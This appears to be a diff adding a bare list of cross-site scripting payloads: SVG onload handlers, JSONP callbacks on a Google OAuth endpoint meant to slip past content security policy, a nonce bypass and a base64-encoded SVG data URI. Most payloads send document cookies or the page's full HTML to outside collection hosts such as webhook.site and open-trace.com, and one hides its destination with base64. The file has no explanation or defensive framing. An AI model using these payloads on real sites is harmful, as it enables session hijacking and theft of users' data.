@@ -1,0 +1,19 @@
+<svg onload="let a=document.createElement('a');a.href=`//webhook.site/url?cookie=${btoa(encodeURIComponent(document.documentElement.outerHTML))}`;document.body.appendChild(a);a.click();">
+<svg onload="document.location=`//webhook.site/url?cookie=${btoa(encodeURIComponent(document.documentElement.outerHTML))}`">
+<svg onload="window.location=`//webhook.site/9c1e14c8-a433-4b17-9377-98a1d5f1fd01?page=${document.cookie}`;">
+
+# JSONP
+
+<script src="https://accounts.google.com/o/oauth2/revoke?callback=document.location=encodeURI('//open-trace.com/create-request/url?f='.concat(document.getElementsByClassName('message')[0].innerHTML));" defer></script>
+<script src="https://accounts.google.com/o/oauth2/revoke?callback=document.location%3D`//open-trace.com/create-request/01jsz39ext32z57yxd575rmd04?f=${btoa(encodeURIComponent(document.body.innerHTML.trim()))}`;" defer></script>
+<script src="https://accounts.google.com/o/oauth2/revoke?callback=document.addEventListener('DOMContentLoaded', function() {document.location%3D`//open-trace.com/create-request/url?f=${btoa(encodeURIComponent(document.body.innerHTML.trim()))}`});;"></script>
+
+
+# nonce bypass
+
+<script nonce="none-regenerate-nonce-value">alert(1)</script>
+<script nonce="none-regenerate-nonce-value">location=atob("Ly9vcGVuLXRyYWNlLmNvbS9jcmVhdGUtcmVxdWVzdC8wMWpzYm0xaGh5cDF3NHFoZmtuN3luNDkwbj9jb29raWU9")%2Bwindow["doc"%2B"ument"]["cookie"]</script>
+
+# media
+
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnPjxzY3JpcHQ+YWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4=">
